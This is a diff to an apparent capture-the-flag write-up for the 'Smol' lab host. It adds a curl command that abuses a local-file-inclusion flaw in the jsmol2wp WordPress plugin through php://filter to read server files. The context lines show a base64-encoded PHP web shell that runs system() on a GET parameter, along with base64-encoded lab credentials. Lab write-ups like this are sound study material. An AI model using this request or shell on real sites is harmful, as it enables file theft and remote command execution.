@@ -49,6 +49,11 @@ echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
 echo -n "YOUR_STRING_HERE" | tr -d '\n\r ' | base64 -d
 echo -n "YWRtaW46cGFzc3dvcmQ=" | base64 -d  # admin:password
 echo -n "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '=' | base64 -d
+
+# curl 로 한 번에 확인
+curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
+base64 -d hello.b64 > hello.php
+
 ```
 
 ---
